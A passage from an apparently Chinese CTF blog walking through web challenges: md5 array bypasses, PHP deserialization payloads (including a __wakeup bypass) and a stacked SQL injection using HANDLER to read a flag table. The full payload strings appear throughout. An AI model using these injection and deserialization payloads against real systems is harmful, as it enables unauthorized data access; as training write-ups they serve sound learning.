<p>（此处类似于[SWPUCTF 2021 新生赛]easy_md5）</p>
<p>于是我们可以采用数组绕过（值都为NULL）或是科学计数法绕过</p>
<p>构造payload</p>
<p><code>/levels91.php?a[]=1&amp;b[]=2</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021722138.png" alt="image-20240102172204101"></p>
<p>和刚刚的类似，两个参数值不同，但md5值相同，但是使用的是POST方法，得利用HackBar</p>
<p>这里是用的强类型比较，即两个参数值和类型都得相同，再次使用数组绕过</p>
<p>输入</p>
<p><code>param1[]=0&amp;param2[]=1</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021728962.png" alt="image-20240102172834916"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021738817.png" alt="image-20240102173809772"></p>
<p>得到flag</p>

        <h1 id="十七、-MRCTF2020-Ez-bypass-1"   >
          <a href="#十七、-MRCTF2020-Ez-bypass-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十七、-MRCTF2020-Ez-bypass-1" class="headerlink" title="十七、[MRCTF2020]Ez_bypass 1"></a>十七、[MRCTF2020]Ez_bypass 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031656440.png" alt="image-20240103165642369"></p>
<p>先通过GET方法传入id和gg，值不同但md5值要相同</p>
<p>接着再用POST方法传入passwd，passwd值要为1234567，但是又用了is_numeric()函数进行判断，表示密码不能仅仅是一个数字，那直接在后面随便加个字母</p>
<p>先传入id和gg</p>
<p><code>/?id[]=1&amp;gg[]=2</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031659394.png" alt="image-20240103165958346"></p>
<p>表明第一步完成，接着传入passwd，借助HackBar</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031700323.png" alt="image-20240103170040267"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031701777.png" alt="image-20240103170102724"></p>
<p>得到flag</p>

        <h1 id="十八、-网鼎杯-2020-青龙组-AreUSerialz-1"   >
          <a href="#十八、-网鼎杯-2020-青龙组-AreUSerialz-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十八、-网鼎杯-2020-青龙组-AreUSerialz-1" class="headerlink" title="十八、[网鼎杯 2020 青龙组]AreUSerialz 1"></a>十八、[网鼎杯 2020 青龙组]AreUSerialz 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718311.png" alt="image-20240104171810248"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718517.png" alt="image-20240104171824476"></p>
<p>阅读代码可知，满足条件op=2，执行read读的操作；满足content&lt;100即可绕过；最后用GET方式传参str，而且最后的代码也提示了使用php反序列化</p>
<p>根据op=2和filename=flag.php写出反序列化代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public $op = 2;</span><br><span class="line">    public $filename = &quot;flag.php&quot;;</span><br><span class="line">    public $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new FileHandler());</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></div></figure>

<p>（此处将三个变量的类型换成了public类型，否则序列化后会产生星号*）运行后得到序列化</p>
<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code> </p>
<p>构造payload</p>
<p><code>/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
<p>回车查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041930727.png" alt="image-20240104193053674"></p>
<p>得到flag</p>

        <h1 id="十九、-GYCTF2020-Blacklist-1"   >
          <a href="#十九、-GYCTF2020-Blacklist-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十九、-GYCTF2020-Blacklist-1" class="headerlink" title="十九、[GYCTF2020]Blacklist 1"></a>十九、[GYCTF2020]Blacklist 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041951047.png" alt="image-20240104195127003"></p>
<p>和之前的  四、[强网杯 2019]随便注 1 很相似，但是只能利用open和handler</p>
<p>输入select</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041955252.png" alt="image-20240104195558198"></p>
<p>可以看到之前用的 修改表名 和 预处理 所需的关键字都被过滤了</p>
<p>查询一下表</p>
<p><code>&#39;;show tables#</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042000563.png" alt="image-20240104200022523"></p>
<p>直接查询“FlagHere”表的结构</p>
<p><code>&#39;;show columns from FlagHere#</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042001914.png" alt="image-20240104200132875"></p>
<p>于是可以构造payload</p>
<p><code>&#39;;handler</code>FlagHere<code>open as a;handler a read next;#</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041958103.png" alt="image-20240104195836055"></p>
<p>获得flag</p>

        <h1 id="二十、-极客大挑战-2019-PHP-1"   >
          <a href="#二十、-极客大挑战-2019-PHP-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十、-极客大挑战-2019-PHP-1" class="headerlink" title="二十、[极客大挑战 2019]PHP 1"></a>二十、[极客大挑战 2019]PHP 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051629835.png" alt="image-20240105162914690"></p>
<p>提示了我们备份，可以直接下载一下<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.zip/" >www.zip</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>输入</p>
<p><code>/www.zip</code></p>
<p>回车即开始下载</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051631055.png" alt="image-20240105163130011"></p>
<p>可以看到有三个php文件，分别打开来看</p>
<p>flag.php：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>index.php:</p>
<p>重点在</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line"> $select = $_GET[&#x27;select&#x27;];</span><br><span class="line"></span><br><span class="line"> $res=unserialize(@$select);</span><br></pre></td></tr></table></div></figure>

<p>解读一下，用GET方法传入参数select，后面也提示了用反序列化</p>
<p>class.php:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>即当参数username=’admin’和password=100时才会有flag，编写代码进行序列化</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    //省略部分函数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Name(&#x27;admin&#x27;,100); </span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>运行后得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051641173.png" alt="image-20240105164108131"></p>
<p>由于private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度</p>
<p>但是在class.php中多了一个wakeup()函数</p>
<p>绕过_wakeup函数的方法：<em>当成员属性数目大于实际数目时可绕过wakeup方法</em></p>
<p>所以需要把成员数目的2变成大于2的数字，例如4，即输入</p>
<p><code>/?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>
<p>回车</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051654105.png" alt="image-20240105165440045"></p>
<p>得到flag</p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>